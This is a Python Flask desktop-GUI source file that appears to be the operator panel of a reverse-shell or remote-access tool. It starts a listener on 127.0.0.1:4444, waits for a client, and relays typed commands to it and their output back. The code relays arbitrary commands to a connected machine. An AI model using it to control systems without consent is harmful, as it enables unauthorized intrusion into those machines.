from flask import Flask, jsonify, render_template, redirect, request
from flaskwebgui import FlaskUI
from threading import Thread
from datetime import datetime
import os
import socket
from server import Server
from urllib.parse import quote

app = Flask(__name__)
ui = FlaskUI(app)

connected = False
server_running = False
server = None
check_connection_thread = None

@app.route('/')
def index():
    return render_template('index.html', title='Server Initiation')

@app.route('/initiate_server', methods=['POST'])
def initiate_server():
    global server, connected, server_running, check_connection_thread
    server_thread = Thread(target=build_connection)
    server_thread.start()
    
    return redirect('/waiting')

@app.route('/waiting')
def waiting():
    return render_template('waiting.html', title='Waiting for connection')

@app.route('/panel', methods=['GET', 'POST'])
def panel():
    global server
    result = request.args.get('result', '')  # Retrieve the result parameter

    if request.method == 'POST':
        # Retrieve the command from the form
        command = request.form.get('command')
        if command:
            # Send the command to the server
            server.send_command(command)

    return render_template('gui_index.html', title='Panel', message='', output=result)

@app.route('/client_connected', methods=['POST'])
def client_connected():
    return 'Client connected'

@app.route('/check_connection')
def check_connection():
    global connected
    return jsonify({'connected': connected})

@app.route('/send_command', methods=['POST'])
def send_command():
    command_result = server.send_command(request.form.get('command'))

    # Sanitize the result to remove or replace newline characters
    sanitized_result = command_result.replace('\n', ' ')

    # Encode the sanitized result for safe inclusion in the URL
    encoded_result = quote(sanitized_result)

    return redirect(f'/panel?result={encoded_result}')

def build_connection():
    global server, connected, server_running
    server = Server('127.0.0.1', 4444)

    try:
        server.build_connection()
        connected = True
        server_running = True        

    except Exception as e:
        print(f"Error in build_connection: {str(e)}")
        connected = False
        server_running = False

def run_flask_app():
    FlaskUI(app=app, server="flask", width=800, height=600).run()

if __name__ == '__main__':
    flask_thread = Thread(target=run_flask_app)
    flask_thread.start()
